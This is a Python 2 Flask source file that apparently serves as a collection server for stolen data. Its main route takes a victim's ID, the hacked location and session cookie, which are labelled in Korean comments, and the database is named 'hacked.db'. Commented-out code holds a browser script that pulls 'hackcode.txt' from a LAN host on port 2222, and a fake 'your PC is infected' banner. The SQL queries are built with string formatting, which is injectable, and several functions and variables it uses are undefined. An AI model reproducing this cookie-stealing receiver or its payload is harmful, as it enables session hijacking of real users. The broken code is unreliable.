#-*- coding:utf-8 -*-
from flask import Flask, request, session, g, render_template, redirect, url_for, send_from_directory, jsonify
from flask_basicauth import BasicAuth
from werkzeug import secure_filename
import sqlite3, hashlib, os, datetime, json, requests
#from bs4 import BeautifulSoup 
#import lxml, requests, datetime

app = Flask(__name__)# static_folder='uploads'

#It is used as a Linux command.
def day_date():    
    now = datetime.datetime.now()
    print type(now)
    nowday=now.strftime('%Y-%m-%d %H:%M:%S')
    return nowday

basic_auth = BasicAuth(app) #Object for authentication
DATABASE = './db/hacked.db' 

def get_db():  #Usage a USERS
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)   #'./db/user.db'
    return db

####################################################################################################################################
def init_db():
    with app.app_context():
        db = get_db()
        f = open('schema.sql', 'r')
        db.execute(f.read())
        db.commit()
        db.close()

#########################################################################################################################
## Where is data manipulation language of notice board.
def search_board(text="", select=""):
    text = text.encode('utf-8')
    sql = 'SELECT * FROM notice_board WHERE id="{}" ORDER BY idx desc'.format(text)
    db = get_dbnotice()
    rv = db.execute(sql)
    res = rv.fetchall()
    return res
#########################################################################################################################
## Where is data manipulation language of USERS
def save_user(ar_id, ar_pw, ar_name, ar_email, ar_phone):
    sql = 'INSERT INTO users (id, pw, name, email, phone) VALUES("{}", "{}", "{}", "{}", "{}")'.format(ar_id, ar_pw, ar_name, ar_email, ar_phone)
    db = get_db()
    db.execute(sql)
    db.commit()
    db.close()
    return ''


def all_get_user():
    sql = 'SELECT * FROM users'
    db = get_db()
    rv = db.execute(sql)
    allres = rv.fetchall()
    return allres

@app.route('/', methods=['GET', 'POST']) #Routing Default
def menetory(): 
    data=list()      
    #a는 사용자 아이디
    #b는 사용자 해킹 당한 위치
    #c는 사용자 쿠키    
    print request.form.get('a')
    print request.form.get('b')
    print request.form.get('c')
    #data.append(request.form.get('a'))
    #data.append(request.form.get('b'))
    #data.append(request.form.get('c'))
    #print '{}'.format(text)
    return render_template('list.html', a = request.form.get('a'), b = request.form.get('b'), c = request.form.get('c'))
    #return '<h1>[해킹] 당신의 PC는 감염되었습니다.[해킹] {}</h1>'.format(text)
    
    #<script>var a = document.createElement("a");
#a.href = 'http://192.168.0.209:2222/';
#a.download = 'hackcode.txt';
#a.click();</script>
    #return redirect(url_for('me_list')) 


@app.route('/list', methods=['GET'])
def me_list():
    request.get('')   
    res_list=[]
    board_re=[]    
    for re_num in board_r:
        board_re.append(len(get_noticedb_list_re(re_num[0])))
    for x in range(len(board_r)):
        res_list.append(("",""))
        res_list[x] = ((board_r[x], board_re[x]))        
    return render_template('list.html', data = res_list, logon = menubar(), length = len(res_list))

if __name__ == '__main__':
    #init_db()    
    app.run(debug=True, host='0.0.0.0', port=2222)
    
